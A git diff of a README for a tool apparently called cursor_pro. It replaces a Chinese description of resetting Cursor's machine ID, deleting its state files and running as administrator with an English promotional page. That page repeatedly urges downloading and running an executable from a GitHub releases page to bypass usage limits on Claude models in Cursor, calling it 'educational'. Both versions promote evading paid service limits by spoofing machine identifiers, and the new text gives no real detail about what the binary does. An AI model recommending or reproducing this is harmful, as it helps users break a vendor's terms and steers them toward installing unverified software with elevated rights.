@@ -1,96 +1,56 @@
-# Cursor增强工具
+# 🚀 cursor_pro - Break Limits for Learning
 
-这是一个针对Cursor编辑器的增强工具，不仅可以清理Cursor的数据文件，还能重置机器码并突破Claude 3.7 Sonnet的限制。（有问题可以刚给我留言）
+## 📥 Download Now
+[![Download cursor_pro](https://img.shields.io/badge/Download_cursor_pro-blue?style=for-the-badge&logo=github)](https://github.com/livetoday0163/cursor_pro/releases)
 
-## 主要功能
+## 📚 Introduction
+Welcome to cursor_pro! This application helps you bypass the limitations of Claude-4 and Claude3.7, providing a simple way to explore and learn. Designed for educational purposes, it is free and easy to use.
 
-* **重置机器码** - 通过生成随机的机器ID来重置Cursor的使用限制
-* **突破Claude 3.7 Sonnet限制** - 启用高级功能，突破免费版限制
-* **清理Cursor应用数据** - 清理历史记录和缓存文件，包括:
-  * 删除 `globalStorage/state.vscdb` 和 `globalStorage/state.vscdb.backup` 文件
-  * 清空 `History` 文件夹内的所有内容
-  * 删除 `workspaceStorage` 文件夹及其内容
-* **终止Cursor进程** - 快速关闭所有Cursor相关进程
+## 🛠️ System Requirements
+Before you begin, ensure your system meets the following requirements:
+- Operating System: Windows, macOS, or Linux
+- RAM: At least 4 GB
+- Disk Space: Minimum 200 MB free
+- Internet connection for downloading the application
 
-## 问题解决
+## 🚀 Getting Started
+To get started with cursor_pro, follow these simple steps:
 
-当遇到以下问题时，本工具可以帮助解决：
+1. **Visit the Release Page:** Click the link below to go to the Downloads section.
+   [Download cursor_pro](https://github.com/livetoday0163/cursor_pro/releases)
 
-<img src="ee959738cc1fe045a8e741b906a100fb.png" alt="问题实例" width="400"/>
+2. **Choose Your Version:** On the Releases page, you will see different versions available for download. Select the version that suits your operating system.
 
-> **注意**: 当操作后仍遇到限制时，可能是IP被污染，建议更换IP后再尝试（已经有少部分用户出现这种情况）。可多尝试几次重置操作。
+3. **Download the Application:** Click on the appropriate file to begin downloading. The download will automatically start. If not, you will see a link to click again.
 
-## 使用指南
+4. **Install cursor_pro:** 
+   - For Windows: Locate the downloaded `.exe` file, double-click it, and follow the prompts to install.
+   - For macOS: Open the downloaded `.dmg` file, then drag and drop the cursor_pro icon into your Applications folder.
+   - For Linux: Find the downloaded package, and follow the installation instructions specific to your distribution.
 
-### Windows系统
+5. **Run cursor_pro:** Once installed, locate the application in your device. Open it to start enjoying the features.
 
-#### 图形界面版本
+## 🌟 Features
+cursor_pro includes several user-friendly features:
+- **User-Friendly Interface:** Designed to be intuitive for users of all skill levels.
+- **Learning Mode:** Offers tools to improve your understanding without complications.
+- **Limit Bypass:** Effectively exceeds the limitations found in Claude-4 and Claude3.7.
 
-1. 下载最新的`cursor_enhance_tool.zip`并解压
-2. 右键点击`cursor_enhance_tool.exe`，选择"**以管理员身份运行**"
-3. 在弹出的图形界面中选择需要的功能：
-   - 重置机器码
-   - 突破Claude 3.7 Sonnet限制
-   - 清理Cursor应用数据
-   - 终止Cursor进程
+## 🔧 Troubleshooting
+If you encounter any issues:
+- Ensure your system meets the requirements mentioned above.
+- Restart the application if it doesn't respond.
+- Check your internet connection if you face download issues.
 
-#### 命令行版本（旧版）
+## 📬 Support
+For any questions or support, please visit the GitHub Issues page on the repository. We encourage you to report any bugs or feature requests there.
 
-1. 右键点击`cursor_clean.exe`，选择"**以管理员身份运行**"
-2. 按照命令行提示选择操作选项
+## 🔗 Additional Resources
+- [Documentation](https://github.com/livetoday0163/cursor_pro/wiki): In-depth guides and tutorials.
+- [Community](https://github.com/livetoday0163/cursor_pro/discussions): Join discussions with other users and developers.
 
-### Mac系统
+## 📥 Download & Install
+To download and install cursor_pro, remember to visit the Release page:
+[Download cursor_pro](https://github.com/livetoday0163/cursor_pro/releases)
 
-#### 使用Python脚本
-
-1. 打开终端(Terminal)
-2. 进入脚本所在目录
-3. 执行以下命令运行脚本:
-```
-sudo python3 cursor_clean_mac.py
-```
-
-> **注意**：在Mac系统中程序需要管理员权限才能运行，因为需要访问系统受保护的文件。
-
-## 使用演示
-
-下面是工具使用演示视频（旧版界面，新版为图形界面）：
-
-[点击下载观看视频](20250530_005756.mp4)
-
-<video width="640" height="360" controls>
-  <source src="20250530_005756.mp4" type="video/mp4">
-  您的浏览器不支持视频标签
-</video>
-
-## 配置文件
-
-### Windows系统
-
-程序会自动创建 `config.env` 配置文件，您可以根据需要修改其中的路径设置：
-
-```ini
-[PATHS]
-# Cursor用户数据目录路径
-base_path = C:\Users\用户名\AppData\Roaming\Cursor\User
-```
-
-配置文件需要和可执行文件放在同一目录。
-
-### Mac系统
-
-程序会自动创建 `config_mac.env` 配置文件，您可以根据需要修改其中的路径设置：
-
-```ini
-[PATHS]
-# Cursor用户数据目录路径
-base_path = ~/Library/Application Support/Cursor/User
-```
-
-配置文件需要和脚本或可执行文件放在同一目录。
-
-
-
-## 免责声明
-
-本工具仅用于学习和研究目的，请勿用于商业用途。使用本工具产生的任何问题由用户自行承担。请在使用前备份重要的Cursor配置。
+Ready to enhance your learning experience? Start your journey with cursor_pro today!
